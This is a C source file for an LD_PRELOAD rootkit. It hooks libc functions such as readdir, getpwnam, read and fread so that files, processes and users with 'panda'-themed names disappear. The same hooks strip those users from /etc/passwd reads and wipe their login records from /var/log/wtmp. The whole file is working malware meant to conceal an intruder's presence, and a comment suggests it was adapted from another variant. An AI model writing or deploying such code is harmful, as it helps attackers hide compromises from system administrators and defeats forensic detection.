#define _GNU_SOURCE

#include <dirent.h>
#include <string.h>
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <pwd.h>
#include <errno.h>
#include <stdarg.h>
#include <unistd.h>
#include <utmp.h>

// Exact filenames to hide (Panda theme)
static const char *hide_exact[] = {
	"license.php",
	"image.sh",
	"panda.exe",
	"bamboo.sh"
};
// Substring to hide (Panda theme partial matches)
static const char *hide_partial[] = {
	"panda",
	"mustang",
	"gothic",
	"redapollo",
	"stonepanda",
	"winnti"
};
// Hidden users (Panda theme)
static const char *hide_user[] = {
	"panda",
	"mustangpanda",
	"gothicpanda",
	"redapollo"
};

// Check for exact match
int match_exact(const char *name){
	for (int i = 0; i < sizeof(hide_exact)/sizeof(hide_exact[0]); i++) {
		if (strcmp(name, hide_exact[i]) == 0)
			return 1;
	}
	return 0;
}	
// Check for partial match
int match_partial(const char *name) {
	for (int i = 0; i < sizeof(hide_partial)/sizeof(hide_partial[0]); i++) {
		if (strstr(name, hide_partial[i]) != NULL)
			return 1;
	}
	return 0;
}
// Match user
int match_user(const char *name) {
	for (int i =0; i< sizeof(hide_user)/sizeof(hide_user[0]); i++) {
		if (strcmp(name, hide_user[i]) == 0)
			return 1;
	}
	return 0;
}

// Hooked readdir() Function
struct dirent *readdir(DIR *drip){
	static struct dirent *(*original_readdir)(DIR *) = NULL;
	if (!original_readdir)
		original_readdir = dlsym(RTLD_NEXT, "readdir");

	struct dirent *entry;

	while ((entry = original_readdir(drip)) != NULL) {
		//Hide based on filename
		if (match_exact(entry->d_name) || match_partial(entry->d_name))
			continue;

		//Special case: /proc directory (like ps aux)
		if (dirfd(drip) == dirfd(opendir("/proc"))) {
			int is_pid = 1;
			for (int i = 0; entry->d_name[i] != '\0'; i++) {
				if (!isdigit(entry->d_name[i])) {
					is_pid = 0;
					break;
				}
			}

			if (is_pid) {
				char cmdline_path[256];
				snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%.240s/cmdline", entry->d_name);
			
				FILE *f =fopen(cmdline_path, "r");
				if (f) {
					char cmdline[256];
					fread(cmdline, 1, sizeof(cmdline), f);
					fclose(f);

					if (match_exact(cmdline) || match_partial(cmdline))
						continue;
				}
			}
		}
		return entry;
	}
	return NULL;
}

// Hide user from enumeration
struct passwd *getpwent(void) {
	static struct passwd *(*original_getpwent)(void) = NULL;
	if (!original_getpwent)
		original_getpwent = dlsym(RTLD_NEXT, "getpwent");

	struct passwd *entry;
	while ((entry = original_getpwent()) != NULL) {
		if (match_user(entry->pw_name))
			continue;
		return entry;
	}
	return NULL;
}

// Hide user from name lookup
struct passwd *getpwnam(const char *name) {
	static struct passwd *(*original_getpwnam)(const char *) = NULL;
	if (!original_getpwnam)
		original_getpwnam = dlsym(RTLD_NEXT, "getpwnam");

	if (match_user(name))
		return NULL;
	return original_getpwnam(name);
}

// Hide user from UID lookup
struct passwd *getpwuid(uid_t uid) {
	static struct passwd *(*original_getpwuid)(uid_t) = NULL;
	if (!original_getpwuid)
		original_getpwuid = dlsym(RTLD_NEXT, "getpwuid");

	struct passwd *entry = original_getpwuid(uid);
	if ( entry && match_user(entry->pw_name))
		return NULL;
	return entry;
}

// Hide user from /etc/passwd via read()
ssize_t read(int fd, void *buf, size_t count) {
	static ssize_t (*original_read)(int, void *, size_t) = NULL;
	if (!original_read)
		original_read = dlsym(RTLD_NEXT, "read");

	char path[256], resolved[256];
	snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
	ssize_t len = readlink(path, resolved, sizeof(resolved) -1);
	if (len != -1) {
		resolved[len] = '\0';
		// Filter /etc/passwd
		if (strstr(resolved, "/etc/passwd")) {
			ssize_t bytes = original_read(fd, buf, count);
			if (bytes <= 0)return bytes;

			char *start = buf;
			char *end = start + bytes;
			char *write = start;

			while (start < end) {
				char *line_end = memchr(start, '\n', end- start);
				if (!line_end) break;
				line_end++;

				// Check for panda users instead of gekkomon
				if (!memmem(start, line_end -start, "panda", 5) &&
				    !memmem(start, line_end -start, "mustangpanda", 11) &&
				    !memmem(start, line_end -start, "gothicpanda", 10)) {
					memmove(write, start, line_end - start);
					write += line_end - start;
				}

				start = line_end;
			}
			return write - (char *)buf;
		}
		// Filter /var/log/wtmp aka last
		if (strstr(resolved, "/var/log/wtmp")) {
			ssize_t bytes = original_read(fd, buf, count);
			if ( bytes <= 0 || bytes % sizeof(struct utmp) != 0)
				return bytes;

			struct utmp *entries = (struct utmp *)buf;
			size_t total = bytes /sizeof(struct utmp);
			size_t write = 0;

			for (size_t i = 0; i < total; i++) {
				if (strncmp(entries[i].ut_user, "panda", 5) != 0 &&
				    strncmp(entries[i].ut_user, "mustangpanda", 12) != 0) {
					if (write != i)
						memcpy(&entries[write], &entries[i], sizeof(struct utmp));
					write++;
				}
			}
			return write * sizeof(struct utmp);
		}
	}
	return original_read(fd, buf, count);
}

// Hide user from /var/log/wtmp via fread() and getutent
size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream) {
	static size_t (*original_fread)(void *, size_t, size_t, FILE *) = NULL;
	if (!original_fread)
		original_fread = dlsym(RTLD_NEXT, "fread");

	char path[256], resolved[256];
	snprintf(path, sizeof(path), "/proc/self/fd/%d", fileno(stream));
	ssize_t len = readlink(path, resolved, sizeof(resolved) - 1);
	if (len != -1) {
		resolved[len] = '\0';

		if (strstr(resolved, "/var/log/wtmp")) {
			size_t total = original_fread(ptr, size, nmemb, stream);
				
			if (size * total % sizeof(struct utmp) != 0) {
				return total;
			}
			struct utmp *entries = (struct utmp *)ptr;	
			size_t write = 0;

			for (size_t i = 0; i < total; i++) {
				if (strncmp(entries[i].ut_user, "panda", 5) != 0 &&
				    strncmp(entries[i].ut_user, "mustangpanda", 12) != 0) {
					if (write != i)
						memcpy(&entries[write], &entries[i], sizeof(struct utmp));
					write++;
				}
			}
			return (write * sizeof(struct utmp)) / size;
		}
	}
	return original_fread(ptr, size, nmemb, stream);
}

//getutent
struct utmp *getutent(void){
	static struct utmp *(*original_getutent)(void) = NULL;
	if (!original_getutent)
		original_getutent = dlsym(RTLD_NEXT, "getutent");

	struct utmp *entry;
	while ((entry = original_getutent()) != NULL) {
		if (strncmp(entry->ut_user, "panda", 5) != 0 &&
		    strncmp(entry->ut_user, "mustangpanda", 12) != 0) {
			return entry;
		}
	}
	return NULL;
}

// Intercept fopen for /etc/passwd and /var/log/wtmp
FILE *fopen(const char *pathname, const char *mode) {
	static FILE *(*original_fopen)(const char *, const char *) = NULL;
	if (!original_fopen)
		original_fopen = dlsym(RTLD_NEXT, "fopen");

	if (strstr(pathname, "/etc/passwd"));
	if (strstr(pathname, "var/log/wtmp"));	

	return original_fopen(pathname, mode);	
}
